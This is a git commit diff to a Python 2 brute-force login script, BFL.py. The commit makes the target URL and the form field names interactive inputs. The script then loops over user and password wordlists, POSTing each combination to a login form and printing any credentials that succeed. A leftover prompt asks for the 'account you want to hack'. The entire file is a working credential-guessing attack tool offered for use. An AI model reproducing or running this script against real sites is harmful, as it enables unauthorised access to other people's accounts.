7713ff7d003e604c9c5bbf2be96f35864d8ac660
Ange <s4nixd@gmail.com>
2018-11-24 08:14:02 +0100

    Perfectionning the way to get data and initialize most GLOBAL VARIABLES

--- BFL.py
+++ BFL.py
@@ -1,51 +1,54 @@
-#####################################
-# Brute Force Login                 #
-# Author Sanix Darker               #
-# https://github.com/Sanix-Darker   #
-#####################################
+####################################
+# => Brute Force Login <=          #
+# By S4n1x D4rk3r                  #
+# https://github.com/Sanix-Darker  #
+####################################
 
 import requests
 
-print "\n#####################################"
-print "# Brute Force Login                 #"
-print "# Author Sanix Darker               #"
+print "\n###################################"
+print "# => Brute Force Login <=           #"
+print "# By S4n1x D4rk3r                   #"
 print "# https://github.com/Sanix-Darker   #"
 print "#####################################"
 
 # The link of the website
-url = 'http://www.example.com/index.php'
+url = raw_input("\nEnter URL:")
 # The userfield in the form of the login
-userField = 'email'
+userField = raw_input("\nEnter the User Field:")
 # The passwordfield in the form
-passwordField = 'pass'
+passwordField = raw_input("\nEnter the Password field:")
+# list of potential incorrect message in the page if it doesn't succeed
+incorrectMessage = ['incorrect', 'required error']
 
 
-# The file contains per lines many possibilities of password
-fakepass_db = open('dictionary.txt')
-lines = fakepass_db.readlines()
+# Getting list of potentials password
+passwords = open('passwords.txt').readlines()
+# Getting list of user to test with
+users = open('users.txt').readlines()
 
-print "Connecting to: "+url+"..."
 
+print "Connecting to: "+url+"......"
 # Put the target email you want to hack
-user_email = raw_input("\nEnter EMAIL / USERNAME of the account you want to hack:")
-
+#user_email = raw_input("\nEnter EMAIL / USERNAME of the account you want to hack:")
 failed_aftertry = 0
-for line in lines:
-    dados = {userField: user_email,
-             passwordField: line}
-
-    # Doing the post form
-    data = requests.post(url, data=dados)
-
-    #print data.text
-    if "404 - Not Found" in data.text:
-        if failed_aftertry > 4:
-            break
+for user in users:
+    for password in passwords:
+        dados = {userField: user,
+                 passwordField: password}
+        # Doing the post form
+        data = requests.post(url, data=dados)
+        #print data.text
+        if "404 - Not Found" in data.text:
+            if failed_aftertry > 5:
+                print "Connexion failed : Trying again ...."
+                break
+            else:
+                failed_aftertry = failed_aftertry+1
+                print "Connexion failed : 404 Not Found (Verify your link)"
         else:
-            failed_aftertry = failed_aftertry+1
-            print "Connexion failed : 404 Not Found (Verify your link)"
-    else:
-        if "incorrect" in data.text:
-            print "Failed to connect :", line
-        else:
-            print "Trying this password :", line
+            if incorrectMessage[0] in data.text or incorrectMessage[1] in data.text:
+                print "Failed to connect with user: "+user+" and password: "+password
+            else:
+                print "YOUPIII!! Theese Credentials succeed:  user: "+user+" and password: "+password
+                break
